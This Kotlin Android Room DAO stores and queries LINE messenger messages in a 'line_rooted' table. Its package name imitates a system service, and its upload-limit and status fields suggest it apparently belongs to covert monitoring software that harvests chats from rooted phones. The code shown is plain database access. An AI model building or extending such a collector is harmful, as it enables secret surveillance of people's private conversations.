package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.LineRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface LineRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(line: List<LineRooted>)

    @Query("Select * from line_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllLineMessages(status: Int): List<LineRooted>

    @Query("Update line_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from line_rooted")
    fun selectMaxTimeStamp(): Long?
}